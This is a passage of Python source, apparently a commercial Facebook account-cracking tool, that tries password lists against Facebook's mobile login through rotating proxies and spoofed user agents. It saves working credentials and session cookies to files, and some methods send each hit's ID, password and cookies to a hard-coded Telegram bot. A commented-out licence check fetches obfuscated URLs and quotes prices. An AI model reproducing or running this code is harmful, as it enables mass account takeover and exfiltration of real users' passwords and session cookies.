			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1013557125334052&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.4%2Fdialog%2Foauth%3Fclient_id%3D1013557125334052%26scope%3Dpublic_profile%252Cemail%26state%3D505879130cdf4eb692edb1fada6f60bf%26redirect_uri%3Dhttps%253A%252F%252Fforum.idws.id%252Fregister%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6f4f0eba-2099-4a83-983f-69e987f8f25f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fforum.idws.id%2Fregister%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D505879130cdf4eb692edb1fada6f60bf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr#_=_")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}")
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D542599432471018%26redirect_uri%3Dhttps%253A%252F%252Fmedium.com%252Fm%252Fcallback%252Ffacebook%26scope%3Dpublic_profile%252Cemail%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%26response_type%3Dtoken%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D51f6b7c3-e4b9-4003-938d-568af35e4366%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/v5.0/dialog/oauth?client_id=542599432471018&redirect_uri=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook&scope=public_profile%2Cemail&state=facebook-%7Chttps%3A%2F%2Fmedium.com%2F%3Fsource%3Dlogin--------------------------lo_home_nav-----------%7Clogin%7Cb4222fa6cc3f75a8f10e683e15ac4f26%7Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf&response_type=token&ret=login&fbapp_pres=0&logger_id=51f6b7c3-e4b9-4003-938d-568af35e4366&tp=unspecified"}
			heade={'Host': 'm.facebook.com',
			       'cache-control': 'max-age=0',
			       ':scheme': 'https',
			       'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102"',
			       'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			       'upgrade-insecure-requests': '1',
			       'origin': 'https://m.facebook.com',
			       'content-type': 'text/html; charset=utf-8 ',
			       'user-agent': ua,
			       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			       'sec-fetch-site': 'none',
			       'sec-fetch-mode': 'navigate',
			       'sec-fetch-dest': 'document',
			       'referer':'https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D542599432471018%26redirect_uri%3Dhttps%253A%252F%252Fmedium.com%252Fm%252Fcallback%252Ffacebook%26scope%3Dpublic_profile%252Cemail%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%26response_type%3Dtoken%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D51f6b7c3-e4b9-4003-938d-568af35e4366%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr',
			       'accept-encoding':'gzip, deflate br',
			       'accept-language':'en-US,en;q=0.9'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE-MOBILE-V2 ]-----------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
#			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdc=1&_rdr#_=_")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}")
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#ERROR BYPASSING
#def genkey():
#        try:
#                basex = open('/sdcard/Android/media/.libr-cpq', 'r').read()
#                basex1 = basex.encode('ascii')
#                basex2 = base64.b64encode(basex1)
#                basex3 = basex2.decode('ascii')
#                base4 = (basex3).upper()
#               nr = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
#                os.system('clear')
#               banner()
#                linex()
#               cetak(f" [[cyan]?[/]] [bold white] Lisensi Anda Belum Disetujui")
#                cetak(f" [[cyan]?[/]] [bold white] Silahkan Chat Ke Admin Untuk Menyetujui Lisensi anda")
#                linex()
#                cetak(f" [[green]![/]] [bold white] Key Lisensi Anda      : [bold green]%s"%(nr))
 #               cetak(f" [[green]![/]] [bold white] Copy Key Anda Kirimkan Kepada Admin Untuk Disetujui ")
#                cetak(f" [[green]![/]] [bold white] Kontak WhatsApp Admin : [bold green]+6283145020179 ")
#                linex()
#                cetak(panel(f"""       [white] [[green]![/]] [bold white] 1 Minggu : 40.000 [[green]![/]] [bold white] 1 Bulan : 100.000\n 
#[[bold red]![/]][bold green] Lisensi Key Mingguan Hanya Berlaku Untuk 1 Device Saja[/]\n[[bold red]![/]][bold green] Untuk Perbulan Bisa Request Maksimal 2 Device Untuk 1 Key""",width=70,title=f"[white]• PRICELIST •",style=f"{color_table}"))
#                linex()
 #               subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=6283145020179&text=%s"%(nr)])
#                exit()
 #       except(IOError):
 #               basex = str(random.randint(1,9999999))
  #              open("/sdcard/Android/media/.libr-cpq","w").write(basex)
 #               os.system("chmod 777 /sdcard/Android/media/.libr-cpq")
  #              genkey()

#ERROR BYPASSING
#def keyx():
#        os.system("touch /sdcard/.key")
#        os.system("rm -rf /sdcard/.key")
#        try:
#                basex = open("/sdcard/Android/media/.libr-cpq","r").read()
#        except(KeyError, IOError):
#                genkey()
#        try:
#                zl = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd77-\xb5(-\xd3OM\xc9,\x01\x00\x95\xfc\nA')
#                rq = requests.get(zl).text
#       except requests.exceptions.ConnectionError:
#               print('%s BAD INTERNET CONNECTION'%(P))
#                exit()
#        basex1 = basex.encode('ascii')
#        basex2 = base64.b64encode(basex1)
#        basex3 = basex2.decode('ascii')
#        base4 = (basex3).upper()
#        nr = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
#        if nr in rq:
#               pass
#        else:
#                genkey()
#def Line_():
#    try:
#        zl = zlib.decompress(b'x\x9ce\xcb1\n\x800\x0c\x00\xc0\x1f%\xbb\xab\xe0?j\x13\xda\x80MJ\x9aR\xf4\xf5.n\xae\x07W#\xfa\xd8\x10=-(\x12u\x9es\xb0g\xd3`\r\xc8\xd6p\xafR\xec\x11^\xe6\x17-!\xfe\xcb7A\x0c[\x12\xc5\xc3\x85\x95\xa0\xdf/\xce\xd6${')
#       r =requests.get(zl).text
#        if "Yes" in r:
#           Code_()
#        else:
#            cetak(f"Lisensi Kadaluarsa Silahkan Chat Admin Untuk Konfirmasi Ulang Lisensi")
#            exit()
#    except requests.exceptions.ConnectionError:
#       print('%s\n BAD INTERNET CONNECTION \n'%(P))
#        exit()
                
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	Code_()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> GITHUB.COM/RENVVV <<<<<#
